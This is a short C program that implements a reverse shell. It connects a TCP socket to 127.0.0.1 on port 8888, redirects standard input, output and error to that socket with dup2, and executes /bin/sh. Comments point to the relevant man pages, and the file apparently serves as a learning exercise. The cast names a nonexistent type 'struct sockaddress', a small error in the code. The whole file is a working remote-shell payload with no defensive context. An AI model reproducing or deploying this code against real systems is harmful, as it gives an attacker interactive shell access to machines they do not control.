#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main(){
	// man socket
	int host_socket = socket(AF_INET, SOCK_STREAM, 0);

	// man 7 ip
	struct sockaddr_in host_address;

	host_address.sin_family = AF_INET;
	// man htons
	host_address.sin_port = htons(8888);
	host_address.sin_addr.s_addr = inet_addr("127.0.0.1");	
	
	//man connect
	connect(host_socket, (struct sockaddress *)&host_address, sizeof(host_address));

	// man dup
	dup2(host_socket, 0);
	dup2(host_socket, 1);
	dup2(host_socket, 2);

	// man execve
	execve("/bin/sh", NULL, NULL);
}
